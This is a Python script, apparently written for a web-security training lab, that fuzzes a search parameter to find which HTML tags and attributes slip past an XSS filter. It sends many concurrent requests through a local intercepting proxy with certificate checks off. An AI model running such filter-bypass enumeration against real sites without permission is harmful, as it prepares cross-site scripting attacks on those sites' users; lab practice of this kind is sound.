import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)

class XSSEnumerate:
    
    def __init__(self):
        lab_id = "0a5d00d603da512780e90dbe00d50038"
        self.url = f"https://{lab_id}.web-security-academy.net/?search="
        self.proxies = {"https":"http://127.0.0.1:8080"}
        print(f"TAKE NOTE OF THE URL: {self.url}")
       # self.headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}

    def query_tag(self, tag):
        response = requests.get(f"{self.url}<{tag}>", proxies=self.proxies, verify=False)
        if response.status_code == 200:
            return tag
            
    def enumerate_tags(self):
        with open(".\\tags.txt", "r") as file:
            tags = [line.strip() for line in file.readlines()]
            
        with ThreadPoolExecutor(max_workers=15) as executor:
            self.found_tags =  [x for x in executor.map(self.query_tag, tags) if x is not None] 
        
        return self.found_tags
        

    def query_attribute(self, attribute):
        """
        Iterates through self.found_tags, to see working attribute for each tag.
        """
        payloads = []
        for tag in self.found_tags:
            response = requests.get(f"{self.url}<{tag} {attribute}>", proxies=self.proxies, verify=False)
            if response.status_code == 200:
                payloads.append(f"<{tag} {attribute}>")
                
        return payloads


    def enumerate_attributes(self):
        with open(".\\attributes.txt", "r") as file:
            attributes = [line.strip() for line in file.readlines()]
            
        with ThreadPoolExecutor(max_workers=30) as executor:
            found_payloads = executor.map(self.query_attribute, attributes)
            
        consolidated = []
        for payloads in found_payloads:
            if payloads:
                for payload in payloads:
                    consolidated.append(payload)
                
            
        return sorted(consolidated) 
            
    def get_payload(self):
        print(self.enumerate_tags())
        print(self.enumerate_attributes())


def main():
    XSSEnumerate().get_payload()
    
if __name__ == "__main__":
    main()
